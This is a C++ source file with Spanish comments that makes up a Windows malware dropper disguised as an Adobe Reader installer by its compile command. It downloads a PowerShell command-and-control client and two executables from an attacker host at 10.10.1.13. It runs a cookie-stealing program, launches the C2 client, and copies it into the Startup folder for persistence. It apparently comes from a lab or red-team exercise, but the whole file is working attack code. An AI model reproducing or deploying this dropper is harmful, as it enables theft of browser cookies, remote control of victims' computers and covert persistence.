#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>
#pragma comment(lib, "urlmon.lib")
#include <lmcons.h>
#include <cstring>
#define LHOST "10.10.1.13"
//#define LHOST "192.168.114.129" // Direccion de pruebas.
#define PSSCRIPT "client.ps1"
#define EXEFILE1 "envia.exe"
#define EXEFILE2 "ejecuta.exe"
using namespace std;
//compilar: i686-w64-mingw32-g++ evil.cpp -o adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++ -Wall



int main(void){
  string ipaddr = LHOST;
  char username[UNLEN+1];
  DWORD username_len = UNLEN+1;
  GetUserName(username, &username_len);
  string user(username);
  //DESCARGA CLIENTE C2 PS SCRIPT
  string file_name = PSSCRIPT;
  string dwnld_URL = "http://"+ipaddr+"/"+file_name;
  string save_path = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + file_name;
  printf("%s", save_path.c_str());
  HRESULT res = URLDownloadToFile(NULL, dwnld_URL.c_str(), save_path.c_str(), 0, NULL);
  if(res == S_OK) {
        printf("Ok\n");
    } else if(res == E_OUTOFMEMORY) {
        printf("Buffer length invalid, or insufficient memory\n");
    } else if(res == INET_E_DOWNLOAD_FAILURE) {
        printf("URL is invalid\n");
    } else {
        printf("Other error: %d\n", res);
    }
  //DESCARGA EXE PARA EXTRAER COOKIES
  file_name = EXEFILE1;
  dwnld_URL = "http://"+ipaddr+"/"+file_name;
  save_path = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + file_name;
  URLDownloadToFile(NULL, dwnld_URL.c_str(), save_path.c_str(), 0, NULL);
  //EXTRAE COOKIES
  system(save_path.c_str());
  //DESCARGA EXE PARA EJECUTAR CLIENTEC2
  file_name = EXEFILE2;
  dwnld_URL = "http://"+ipaddr+"/"+file_name;
  save_path = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + file_name;
  URLDownloadToFile(NULL, dwnld_URL.c_str(), save_path.c_str(), 0, NULL);//AGREGAR COPY TO STARTUP FOLDER.
  //EJECUTA CLIENTE C2
  system(save_path.c_str());
  //PERSISTENCIA - T1060
  string cmd = "COPY \""   + save_path +  "\" \"C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
  //printf("cmd: %s\n", cmd.c_str());
  system(cmd.c_str());
  return 0;
}